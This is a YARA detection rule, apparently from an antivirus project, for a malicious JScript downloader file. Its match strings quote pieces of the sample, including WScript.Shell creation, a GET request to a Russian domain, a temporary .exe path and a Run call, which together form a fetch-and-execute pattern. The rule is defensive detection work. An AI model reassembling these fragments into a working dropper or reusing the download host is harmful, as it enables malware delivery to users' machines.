rule sig_20160330_5156e60e1925fa8494f2182d91e1ffe0 {
  meta:
    description = "datamaliciousorder - file 20160330_5156e60e1925fa8494f2182d91e1ffe0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d09f8c1e9403cb08a786ffee2a39588bc3cbd9e910f5a3a141d78a8713ea30ce"

  strings:
    $s1  = "var NI = function K() {return WScript[SP](\"WScript\"+\".Shell\");}(), S = 11;" fullword ascii
    $s2  = "function MI(RQ, EO){M = M * 1; return RQ - EO;};" fullword ascii
    $s3  = "VP[HD](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s4  = "if (VP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EW(){return SG + \"\";};" fullword ascii
    $s6  = "function N() {return NI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6HEEvFKTnBfY.ex\" + \"e\";};" fullword ascii
    $s7  = "function R() {return ((YT == true) && (YT == IR)) ? 1 : M;};" fullword ascii
    $s8  = "function VK(FR){NI[\"Run\"](FR, M, M);};" fullword ascii
    $s9  = "function B(R0) {var XE = (1, 2, 3, 4, 5, R0); return XE;};" fullword ascii
    $s10 = "function BQ(){return SP;};" fullword ascii
    $s11 = "var DJ = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (IE);" fullword ascii
    $s13 = "return MI(E0, VT);" fullword ascii
    $s14 = "function OS(){return 22;};" fullword ascii
    $s15 = "var GL = false;" fullword ascii
    $s16 = "IR = true; " fullword ascii
    $s17 = "var IR = false;" fullword ascii
    $s18 = "var YT = false;" fullword ascii
    $s19 = "YT = true; " fullword ascii
    $s20 = "} catch(JZ){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}